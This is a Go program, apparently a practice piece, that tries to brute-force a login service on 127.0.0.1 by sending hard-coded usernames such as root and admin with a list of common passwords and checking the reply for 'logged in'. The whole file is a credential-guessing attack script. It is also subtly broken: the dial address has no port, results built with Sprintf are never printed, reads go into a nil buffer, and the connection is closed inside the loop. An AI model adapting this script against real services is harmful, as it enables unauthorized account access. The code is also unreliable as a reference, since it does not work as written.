package main

import (
  "fmt"
  "net"
  //"bytes"
  "strings"
)

func main(){
  userName := []string{
    "hokn",
    "john",
    "done",
    "sam",
    "root",
    "admin",
  }
  passwords := []string{
    "admin",
    " ",
    "password",
    "brute",
    "3l0r@cle!.",
    "root",
  }
  for _,user := range userName{
    conn,err := net.Dial("tcp","127.0.0.1")
    if err != nil{
      fmt.Sprintf("Error connecting. %s",err)
      continue
    }
    _,err = conn.Write([]byte(user))
    if err != nil{
      fmt.Sprintf("Error writing user: %s,\nERROR: %s",user,err)
      continue
    }
    for _,pass := range passwords {
      _,err = conn.Write([]byte(pass))
      if err != nil{
        fmt.Sprintf("Error writing pass: %s,\nERROR: %s",pass,err)
        continue
      }
      var buf []byte
      _,err = conn.Read(buf)
      if err != nil{
        fmt.Sprintf("Error: %s",err);continue
      }
      if strings.Contains(string(buf),"logged in"){
        fmt.Sprintf("Found passwword for %s with pass %s",user,pass)
      }
      if err := conn.Close(); err != nil {
			fmt.Println("[!] Unable to close connection. Is service alive?")
		}
    }
  }
}
